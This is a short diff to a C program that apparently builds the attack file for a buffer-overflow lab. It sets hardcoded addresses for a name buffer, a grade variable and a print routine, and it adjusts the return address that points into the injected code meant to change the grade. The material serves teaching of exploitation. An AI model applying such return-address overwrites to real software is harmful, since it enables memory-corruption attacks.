@@ -16,7 +16,7 @@ int main(void)
     const unsigned long NAME_ADDR   = 0x420058UL;  /* start of name[] in BSS */
     const unsigned long GRADE_ADDR  = 0x420044UL;  /* &grade global ('D') */
     const unsigned long PRINT_ADDR  = 0x40089cUL;
-    unsigned long returnAddr =  0x420058UL + 28;  /* skip-B, print-grade code */
+    unsigned long returnAddr =  0x420058UL + 8;  /* skip-B, print-grade code */
 
     /* 1) Open the attack file for binary write */
     f = fopen("dataA", "w");
